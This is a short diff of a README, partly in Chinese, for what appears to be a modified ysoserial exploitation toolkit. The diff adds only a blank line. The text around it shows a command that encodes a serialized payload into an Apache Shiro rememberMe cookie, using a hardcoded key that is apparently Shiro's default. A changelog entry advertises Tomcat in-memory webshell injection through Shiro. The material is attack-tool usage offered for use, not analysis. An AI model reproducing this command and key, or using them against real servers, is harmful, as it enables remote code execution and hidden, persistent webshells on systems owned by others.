@@ -11,6 +11,7 @@
 
 `java -jar ysoserial-0.0.6-SNAPSHOT-all.jar ShiroRememberMeEncode cbc:kPH+bIxk5D2deZiIxcaaaA==:./demo.ser`
 
+
 ### 更新日志
 2021.0525 可以引入构造好的 class 直接进行 shiro Tomcat 内存马注入，同时可直接调用加密函数进行加密
 
